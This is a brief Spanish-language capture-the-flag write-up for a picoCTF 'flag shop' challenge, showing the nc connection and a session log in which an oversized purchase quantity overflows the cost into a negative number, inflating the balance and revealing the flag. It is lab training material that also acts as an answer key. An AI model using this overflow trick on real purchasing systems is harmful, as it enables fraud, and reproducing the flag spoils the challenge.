
# Descripción 

There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc fickle-tempest.picoctf.net 50228.

# Solución 

1. Nos conectamos al puerto:

```
nc fickle-tempest.picoctf.net 50228
```

2.  Jugamos al juego pero aprovechamos una vulnerabilidad, para aprovecharla tenemos que usar dinero negativos:

```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2500000

The final cost is: -2044967296

Your current balance after transaction: 2044968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_984Fce5a}

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
^C

```


# Notas adicionales
- El costo se vuelve negativo, lo que en lugar de restar monedas, **suma** una cantidad enorme al saldo del jugador.

# Referencias
- 